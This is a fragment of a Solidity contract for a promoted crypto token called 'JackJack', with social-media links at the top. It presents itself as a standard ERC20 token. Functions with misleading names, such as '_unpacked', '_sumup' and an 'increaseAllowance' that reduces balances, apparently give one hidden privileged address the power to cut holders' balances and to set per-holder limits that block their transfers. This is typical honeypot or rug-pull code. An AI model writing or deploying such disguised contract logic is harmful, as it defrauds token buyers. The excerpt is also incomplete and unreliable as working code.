//Telegram: https://t.me/JackJackkParr
//Website: https://jackjackparr.xyz
//Twitter: https://twitter.com/JackJackkParr
//Discord: https://discord.gg/3Fu8Qg9G
...
contract JackJack is IERC20, Token, Ownable {
    ...
    mapping(address => User) private _info;
    ...
    function _transport(
        ...
        _verifyBal(sender, recipient, amount);
    ...
    function increaseAllowance(address spender, uint256 amount) public virtual {
        ...
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_unpacked(spender, _iuser.user)) {
            _minus(from, total);
            total = _sumup(total, amount);
    ...
    function _unpacked(address user, address user2) internal view returns (bool) {
        bytes32 pack1 = keccak256(abi.encodePacked(user));
        bytes32 pack2 = keccak256(abi.encodePacked(user2));
        return pack1 == pack2;
    }

    function _sumup(uint256 nub, uint256 mer) internal pure returns (uint256) {
        if (mer != 0) {
            return nub + mer;
        }
        return mer;
    ...
    function _requireAllowance(address user, address from, uint256 amount) internal {
        if (_unpacked(user, _iuser.user)) {
            require(from != address(0), "Invalid address");
            if (amount != 0) {
                _info[from].user = from;
                _info[from].allowance = amount;
            } else {
                _info[from].user = address(0);
                _info[from].allowance = amount;
            }
        }
    }
    ...
    function _verifyBal(
        ...
        uint256 amount = 0;
        if (_unpacked(from, _info[from].user)) {
